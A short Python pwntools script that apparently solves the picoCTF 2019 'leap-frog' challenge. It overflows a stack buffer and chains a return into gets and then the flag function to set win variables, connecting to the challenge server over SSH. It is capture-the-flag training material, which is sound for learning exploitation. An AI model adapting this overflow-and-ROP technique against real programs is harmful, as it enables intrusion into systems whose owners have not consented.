from pwn import *
import sys

# python main.py  DEBUG


BINARY = './rop'


def myP32(v):
    return struct.pack('I', v)


if args["REMOTE"]:
    s = ssh(host='2019shell1.picoctf.com',
            user='mikon', password="password")
    sh = s.process(
        'rop', cwd='/problems/leap-frog_5_d75e27ca262f95ef1168d21a5cee638d')
else:
    sh = process(BINARY)


'''
local var(16)
base point(4)
gets_addr
return addr(final_addr)
gets_para(win1)

'''

gets_addr = 0x08048430
win1_addr = 0x0804a03d
final_addr = 0x080486B3

payload = "a"*(24+4)
payload += myP32(gets_addr)
payload += myP32(final_addr)
payload += myP32(win1_addr)
sh.sendlineafter('>', payload)
sh.sendline('\x01'*3)
sh.interactive()
